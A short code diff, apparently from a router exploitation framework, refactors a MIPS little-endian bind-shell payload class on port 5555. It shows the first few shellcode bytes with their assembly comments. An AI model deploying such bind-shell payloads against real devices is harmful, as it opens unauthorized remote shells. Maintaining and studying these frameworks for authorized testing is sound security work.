@@ -18,12 +18,13 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "mipsle"
+
     port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
 
     def generate(self):
-        bind_port = self.convert_port(self.port)
+        bind_port = validators.convert_port(self.port)
 
-        self.payload = (
+        return (
             "\xe0\xff\xbd\x27" +        # addiu   sp,sp,-32
             "\xfd\xff\x0e\x24" +        # li      t6,-3
             "\x27\x20\xc0\x01" +        # nor     a0,t6,zero
